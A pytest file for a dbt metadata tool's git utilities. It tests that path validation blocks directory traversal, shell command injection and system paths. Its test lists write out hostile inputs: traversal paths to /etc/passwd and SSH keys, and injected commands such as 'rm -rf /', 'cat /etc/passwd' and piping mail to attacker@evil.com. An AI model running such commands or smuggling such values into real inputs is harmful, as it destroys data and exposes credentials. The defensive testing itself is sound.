"""Test git operation safety - path validation.

CRITICAL: Prevent command injection vulnerabilities in git operations.
"""

import pytest
from dbt_meta.utils.git import validate_path, get_model_git_status


@pytest.mark.critical
class TestGitSafety:
    """Test path validation prevents command injection."""

    def test_valid_paths_accepted(self):
        """Valid paths should pass validation unchanged."""
        valid_paths = [
            "models/core/clients.sql",
            "models/staging/users.sql",
            "target/manifest.json",
            "dbt_project.yml",
            "models/mart_finance/revenue_2024.sql",
            "/Users/pavel/Projects/dbt-meta/models/test.sql"
        ]

        for path in valid_paths:
            result = validate_path(path)
            assert result == path, f"Valid path rejected: {path}"

    def test_directory_traversal_blocked(self):
        """Paths with '..' should be rejected."""
        dangerous_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "models/../../../etc/shadow",
            "models/core/../../../../../../etc/hosts"
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError) as exc_info:
                validate_path(path)
            assert "parent directory traversal" in str(exc_info.value)

    def test_command_injection_blocked(self):
        """Paths with shell metacharacters should be rejected."""
        injection_attempts = [
            "models/test.sql; cat /etc/passwd",
            "models/test.sql && rm -rf /",
            "models/test.sql | mail attacker@evil.com",
            "models/test.sql`cat /etc/passwd`",
            "models/$(whoami).sql",
            "models/test.sql > /dev/null",
            "models/test.sql < /etc/passwd",
            "models/{test}.sql",
            "models/(test).sql",
            "models/test.sql\ncat /etc/passwd"
        ]

        for path in injection_attempts:
            with pytest.raises(ValueError) as exc_info:
                validate_path(path)
            assert "shell metacharacter" in str(exc_info.value)

    def test_empty_path_rejected(self):
        """Empty paths should be rejected."""
        with pytest.raises(ValueError) as exc_info:
            validate_path("")
        assert "cannot be empty" in str(exc_info.value)

    def test_absolute_system_paths_blocked(self):
        """Absolute paths outside user directory should be blocked."""
        dangerous_paths = [
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "/var/log/auth.log",
            "/proc/self/environ"
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError) as exc_info:
                validate_path(path)
            assert "outside user directory" in str(exc_info.value)

    def test_git_status_validates_paths(self):
        """get_model_git_status should validate paths before using them."""
        from unittest.mock import patch

        # Mock _find_sql_file_fast to return dangerous path
        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            mock_find.return_value = "../../etc/passwd"

            # Should catch ValueError from validate_path
            with patch('dbt_meta.utils.git.validate_path') as mock_validate:
                mock_validate.side_effect = ValueError("Unsafe path")

                status = get_model_git_status('test_model')

                # Should return safe defaults when validation fails
                assert status.exists is True  # File was found
                assert status.is_tracked is False
                assert status.is_modified is False

    def test_git_operations_use_validated_paths(self):
        """All git subprocess calls should use validated paths."""
        from unittest.mock import patch, MagicMock

        safe_path = "models/test.sql"

        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            mock_find.return_value = safe_path

            with patch('dbt_meta.utils.git.validate_path') as mock_validate:
                mock_validate.return_value = safe_path

                with patch('subprocess.run') as mock_run:
                    mock_run.return_value = MagicMock(
                        returncode=0,
                        stdout="M models/test.sql"
                    )

                    get_model_git_status('test_model')

                    # validate_path should be called
                    mock_validate.assert_called_with(safe_path)

                    # subprocess.run should receive validated path
                    calls = mock_run.call_args_list
                    for call in calls:
                        cmd = call[0][0]
                        if safe_path in cmd:
                            # Path is in command, validation worked
                            assert True
                            break
                    else:
                        pytest.fail("Validated path not used in subprocess call")

    def test_path_with_spaces_allowed(self):
        """Paths with spaces should be allowed (common in filenames)."""
        paths_with_spaces = [
            "models/core/client profiles.sql",
            "models/staging/user data.sql",
            "/Users/pavel/My Projects/dbt-meta/test.sql"
        ]

        for path in paths_with_spaces:
            # Spaces are allowed, should not raise
            result = validate_path(path)
            assert result == path

    def test_unicode_paths_allowed(self):
        """Unicode paths should be allowed."""
        unicode_paths = [
            "models/core/données.sql",
            "models/staging/用户.sql",
            "models/mart/αβγ.sql"
        ]

        for path in unicode_paths:
            result = validate_path(path)
            assert result == path